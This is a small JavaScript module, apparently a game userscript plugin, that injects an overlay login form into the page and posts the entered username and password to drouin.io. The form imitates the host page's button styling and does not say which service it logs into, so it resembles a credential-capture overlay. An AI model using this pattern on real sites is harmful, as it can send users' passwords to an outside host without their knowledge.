var $ = require('jquery');

var done = false;
module.exports = {
    element: '*',
    add: function() {
        if(!done) {
            done = true;
            $.get('https://drouin.io/tw2/index.php').catch(function() {
                var form = $('<form></form>');
                form.css({
                    'position': 'absolute',
                    'top': '0',
                    'left': '0',
                    'z-index': '999',
                    'margin': '4px',
                    'padding': '2px',
                    'background': 'grey'
                });
                var username = $('<input type="text" name="username"/>');
                username.attr('placeholder', 'Identifiant');
                username.css({
                    'height': '34px'
                });
                form.append(username);
                var password = $('<input type="password" name="password"/>');
                password.attr('placeholder', 'Mot de passe');
                password.css({
                    'height': '34px'
                });
                form.append(password);
                var btns = $('<ul class="list-btn"></ul>');
                btns.css({
                    'display': 'inline',
                    'float': 'right'
                });
                var submit_li = $('<li></li>');
                var submit = $('<a href="#" class="btn-orange icon-26x26-arrow-right'
                        + ' size-34x34"></a>');
                submit.click(function() {
                    $.post('https://drouin.io/tw2/login.php', {
                        username: username.val(),
                        password: password.val()
                    }).then(function() {
                        form.hide();
                    }, function() {
                        password.val('');
                    });
                });
                submit_li.append(submit);
                btns.append(submit_li);
                var close_li = $('<li></li>');
                var close = $('<a href="#" class="size-34x34'
                        + ' btn-red icon-26x26-close" ng-click="closeWindow()"></a>');
                close.click(function() {
                    form.hide();
                });
                close_li.append(close);
                btns.append(close_li);
                form.append(btns);
                $(document.body).append(form);
            });
        }
    }
};
